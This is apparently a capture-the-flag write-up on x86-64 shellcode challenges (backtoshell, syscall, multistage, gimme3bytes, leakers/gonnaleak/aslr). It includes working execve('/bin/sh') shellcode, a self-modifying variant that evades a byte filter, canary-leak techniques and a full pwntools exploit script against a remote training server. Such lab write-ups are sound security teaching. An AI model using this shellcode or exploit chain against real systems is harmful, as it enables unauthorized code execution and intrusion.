# Shellcode

## backtoshell

```c
void main(void) {
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  read(0,UNRECOVERED_JUMPTABLE,0x200);
                    /* WARNING: Could not recover jumptable at 0x00401144. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)(0,0,0,0,0,0);
  return;
}
```

`UNRECOVERED_JUMPTABLE` = the compiler is guessing the presence of a jump table, but its not. Its just a buffer.

**mmap**: `mmap` = linux func that allocates memory regions

If the mmap address is zero, the address will be randomized. The other parameters says where to find the size of the data that will be allocated, and its permissions. The fd is used to load a file into memory. in mmap 7 means rwx.

**read** : `read` = linux syscall that reads bytes from file descriptors (for e.g. 0 is the `fd` of `stdin`). Example:

`read(0, UNRECOVERED_JUMPTABLE, 0x200)` reads from zero into the jump table for `0x200` bytes. Note that this info is obtainable trough  `man`.

### behaviour

`(*memory)(0,0,0,0,0,0)` means: jump to memory. It means that the first six registers contain zeros when jumping. So basically this binary is creating a page in memory, reading user input into it, and then it jumps into it. We want to put some code in that page which when executed will helps us to spawn a shell.

### Putting together the shellcode

First of all we need a **syscall**:

>`syscall` = way that programs use to interact with the kernel, in order for e.g. to r/w a file, send packets, use hw, etc. To execute syscalls, some registers get set up and the syscall is ran. The kernel knows which syscalls is going to be executed by the `rax` register content (for e.g. read has number `0x00`).

To open a shell, we need the `execve` syscall, which has to be executed with `/bin/sh` as first parameter. In order to do that we will put `0x3b` in the `rax` register, and a pointer to `/bin/sh\x00` into `rdi`.

**Note**: Since the code of the binary sets `rsp` to zero, when the program jumps to our shellcode and we push things on the stack, the execution fails. We first need to move the stack in the middle of the memory page allocated with `memmap`, and then we can execute our shellcode.

```assembly
# we want to write code for the following function call:
# execve('/bin/sh', 0, 0);
# x64 calling convention, we need to put arguments in registers:
#   1. rdi: pointer to b'/bin/sh\x00'
#   2. rsi: pointer to NULL
#   3. rdx: pointer to NULL
#   4. rax: 0x3b

# configuring rsp because since we are jumping to an arbitrary location it's set to 0x0
add rax, 0x100	# rax contains the address of our shellcode
mov rsp, rax		# which means that we are putting rsp 100 bytes over it

# rdi setup (pointer to binsh)
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp

# rsi, rdx setup (pointer to NULL)
# note that xoring a register with itself will always result in zero
xor rbx, rbx
push rbx
mov rsi, rbx
mov rdx, rbx

# rax setup (0x3b is the syscall code for execve), and executing the call
mov rax, 0x3b
syscall
```

**Note (zeros)**: that zeros in the exploits need to be avoided is the input is read with a scanf function.

**Note (char array as sycall argument)**: We need to put a pointer to a zero to terminate the array of arguments of the execv function, which means that we need to put a pointer to a zero in the `rsi` register (since the function writes those registers in this order: `rax`, `rdi`, `rsi`).

**Note (rax register)**: The `rax` register is usually used for function return values.

After flagging we can get the source code of the binary from the server:

```c
int main() {
    void *data;
    data = mmap(0, 0x1000, 7, 0x22, -1, 0);
    read(0, data, 0x200);
    register long rax __asm__("rax") = data;
    reset_register();
    asm("jmp %rax");
    return 0;
}

int _start() {
    main();
    exit(0);
}
```

## syscall, syscalr

Here we need an auto modifying shellcode, since the only obstacle to executing our exploit is that we cannot give `\x0f` or `\x05` in input to the `read` otherwise the program would exit:

```c
void get_shellcode(char *buffer){
  int i = 0;
  printf("Send shellcode plz?\n");
  read(0, buffer, 1000);
  for (i = 0; i < 1000; i++){
      if ((buffer[i] == 0xcd || buffer[i] == 0x80) || (buffer[i] == 0x0f || buffer[i] == 0x05)){
          printf("Nonono!\n");
          exit(-1);
      }
  }
}
```

The strategy here is to make the shell code increment the content of the instruction pointer. This means that when the code of the challenge is checked after the read, the incriminated bytes are not found, but when the shellcode is acually executed the final code will contain the opcodes for a `syscall`. Here's the assembly:

```assembly
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rbx, rbx
push rbx
mov rsi, rsp
mov rdx, rsp
mov rax, 0x3b
mov rbx, 0x101
add qword ptr [rip+0x0], rbx
syscall
```

Here we make the code increment by 257 the last two bytes of itself:

```shell
>>> 0x0f05 - 0x0e04
257
```

And then when we get the assembled code:

```
"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC3\x01\x01\x00\x00\x48\x01\x1D\x00\x00\x00\x00\x0F\x05"
```

We can manually swap the last two bytes:

```
"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC3\x01\x01\x00\x00\x48\x01\x1D\x00\x00\x00\x00\x0E\x04"
```

This means that when the code will be run it will first pass the check, and then correct itself to execute `syscall` as last assembly instruction.

## multistage

**Hint**: the challenge name means that we'll probably need a two step exploit for some reason. In this case the problem is the following:

```c
  puts("What is your name?");
  read(0,buffer,20);
```

Which means that we need an exploit no longer than 20 bytes. The following is a valid (but still too long) shellcode:

```assembly
mov rdi, 0x404070+26    ; we store this address (which is a pointer to 'bin/sh\0') in rdi
mov rsi, rdi
add rsi, 8              ; we move the pointer after the bin/sh
mov rdx, rsi
mov rax, 0x3b
syscall
/bin/sh\x00             ; since we are in a read, we can write directly the string
                        ; in the stack.
```

Length: (26 bytes of shellcode +8 of `/bin/sh\x00`) > 20.

**Solution**: execute another `read`, which reads more byte into the `buffer` global variable, in which we will put the `execve` call to spawn a shell:

```assembly
xor rdi, rdi        ; we are reading from stdin
mov rdx, 128        ; how much to read    
mov esi, eax        ; address of where to read, which is at the end of this shellcode
add eax, 0x14
xor rax,rax            ; read syscall
syscall
```

**Note**: `mov` takes up a lot more bytes than `xor`.

We can also put 20 `nop` at the beginning of our shellcode instead of putting `rax+20` in the `rdx` register, and try to shorten even more our shellcode:

```assembly
xor rax, rax
mov rdi, rax
mov esi, 0x404070
mov edx, 0x100        
syscall
```

## gimme3bytes

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>

int main(){
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  printf("  ________.__                         ________   ___.            __                 \n /  _____/|__| _____   _____   ____   \\_____  \\  \\_ |__ ___.__._/  |_  ____   ______\n/   \\  ___|  |/     \\ /     \\_/ __ \\    _(__  <   | __ <   |  |\\   __\\/ __ \\ /  ___/\n\\    \\_\\  \\  |  Y Y  \\  Y Y  \\  ___/   /       \\  | \\_\\ \\___  | |  | \\  ___/ \\___ \\ \n \\______  /__|__|_|  /__|_|  /\\___  > /______  /  |___  / ____| |__|  \\___  >____  >\n        \\/         \\/      \\/     \\/         \\/       \\/\\/                \\/     \\/ \n>");
  char* array = mmap(0, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  int i;
  int temp;
  float ftemp;

  read(0, array, 0x3);
  // write(1, "here we go\\n", 11);
  (*(void(*)())array)();
}
```

Ok so we have a giant memory page allocated to which we put user controlled input into, and then we jump to it and execute it. This would be the simplest ctf ever, if it was not for the fact that we can only read three bytes into it.

This really sucks.

The first thing that comes to mind while tackling this challenge is that we could try to execute another read, but still, how the f*ck would we do that with only 3 bytes of code? To execute a read, since we've got a 64 bit binary and the syscall calling convenction wants function parameters to be set up into registers, we'll need the following:

*  `rax` = `0x0`
*  `rdi` = `0x0`
*  `rsi` = `<READ_CONTENT>`
*   `rdx` = `<READ_LENGTH>`

And then we need to execute the syscall with the relevant opcodes, which alone take up two bytes (`0f 05`). If we run the binary in gdb and we check the content of registers while the program jumps to our shellcode, we'll see the following configuration:

* [x] `rax` = 0
* [x] `rdi` = 0
* [x] `rsi`  = `0x7ffff7ff7000` ( `<destination> `)
* [x] `rdx`  = `0x7ffff7ff7000` (`<how much do we want to read>`)

Where `0x7ffff7ff7000` is the address of the input taken by the `read`. This means that we actually have all we need to correctly perform a `read`. In fact all the registers are correctly set to spawn another read at the time the program jumps to our input.

Note that `rdx` actually contains the address to the page in which our input goes, but since it will be interpreted as an integer representing how much we are going to read, it is more than fine! In fact gdb reports that the address is `0x7ffff7ff7000`, which amounts to 140737354100736. I think its enough.

At first I tried to pass `\x90\x0f\x05`, which is `nop syscall`. Technically it should work, but from `man read` we see that:

> On Linux, read() (and similar system calls) will transfer at most 0x7ffff000 (2,147,479,552) bytes, returning the number of bytes actually  transferred.  (This is true on both 32-bit and 64-bit systems.)

:(

Still, we can change `rdx` content with one byte!

```
pop rdx -> 5a
```

Then, after `rdx` has been properly set up, we can use two syscalls: the first, by using only three bytes, will be a read that will read the proper shellcode to which we'll jump right after the first call. Final exploit:

```python
#!/usr/bin/python3
from pwn import *
...
sc1 = b"\x5A\x0F\x05"
# 2nd sc comes from shellstorm:
# http://shell-storm.org/shellcode/files/shellcode-806.php
sc2 = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
...
p.send(sc1 + b"\x90"*3 + sc2)
p.interactive()
```

**Note**: we can send both shellcodes with one call of the `send` function.

## leakers, gonnaleak, aslr

**Note**: I have put all those challenges in one chapter because they are really similar.

`leakers` code:

```c
int main(){
  char echostring[100];
  int l;
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Leakers gonna leak!\n");
  while(2){
    l = read(0, echostring, 200);
    if(l == 1 && (echostring[0] == '\n' || echostring[0] == '\x00')){
      puts("Bye!");
      break;
    }
    printf("> %s", echostring);
  }
```

**Note**: The source code of the challenge is found in the server directory after obtaining the shell. We are given only the binary. This is true for every challenge.

To leak values from the stack we can exploit the fact that we have a `read` that puts uset input on the stack, but the size check performed is actually bigger than the buffer itself. Since later on the buffer content is displayed via a  `printf`, which stops reading when it encounters a terminator, we have our exploit: the `read` does not put a terminator when it stops (for e.g. the `scanf` does), which means that we can overwrite null bytes that follows the buffer in the stack to leak stack content up to our canary.

To leak stack canary we can give in input to the `read` which fills the local buffer the following content:

```python
"A"*105
```

To completely fill it and to overwrite the null bytes that makes up the padding of the canary. In fact the canary is located right after the local buffer in the stack:

```python
>>> 0x7fffffffe1b0 - 0x7fffffffe218
-104
```

Then the canary gets leaked by the `printf`:

```python
b'output2: A> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALx\xc0q\t\xae\x81p\x12@'
```

And we can extract it with python:

```python
c = output.split(b"A"*105)[1][:7].rjust(8,b"\x00")
print("canary: " + hex(u64(c)))
```

**Gonnaleak** is similar, but one more step is required: we do not have a global buffer, which means that we cannot jump to a fixed address. The obvious solution is to l<u>eak some sort of address from the stack which belongs to the frame of main, which we can use to jump to our local shellcode by doing some math on relative addressing</u>. Full code below.

```python
#!/usr/bin/python3
import sys
from pwn import *

sc = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
a = b"A"*105
b = b"B"*136

context.update(arch='amd64', os='linux')
p = remote("training.jinblack.it", 2011)

input("leaking canary...")
p.send(a)                                        

input("[1] press any key to continue")
output = p.recv()
print(b"output1: " + output)
c = output.split(a)[1][:7].rjust(8, b"\x00")
print("canary: " + hex(u64(c)))

input("leaking useful address from the stack...")
p.send(b)    

input("[2] press any key to continue")
output = p.recv()
print(b"output2: " + output)
addr = output.split(b)[1][:7].ljust(8, b"\x00")
straddr = hex(u64(addr))
print("addr: " + straddr + "\n" + str(addr))

aux = int(straddr, 16)
addr = hex(aux - 343)
print("updated addr: " + addr)

input("injecting shellcode")
addr = struct.pack('<Q', int(addr, base=16))
p.send(b"\x90"*71 + sc + c + b"A"*8 + addr)
p.recv()

input("exiting the loop...")
p.send("\n")
p.recv()
p.interactive()
```

Regarding **ASLR**, we have to go one step further: we have `PIE` enabled, which means no more hardcoded global buffers. We also got `NX`, so no local buffer overflows. To solve this challenge we have to <u>leak the address of the global buffer</u>, which is executable, put there the shellcode and overwrite seip with its address. Source code of the challenge:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>

#define PS1SIZE 100
char ps1[PS1SIZE];

int main(){
  char echostring[100];
  int l;
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Welcome to Leakers!\n");
  if (mprotect((long)ps1 & 0xfffffffffffff000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC) == -1){
    puts("Failed mprotect!");
    return -1;
  }
  l = read(0, ps1, PS1SIZE);
  if (l>1){
    ps1[l-1]='\x00';
   }
  while(2){
    l = read(0, echostring, 200);
    if(l == 1 && (echostring[0] == '\n' || echostring[0] == '\x00')){
      puts("Bye!");
      break;
    }
    printf("%s> %s", ps1, echostring);
  }
```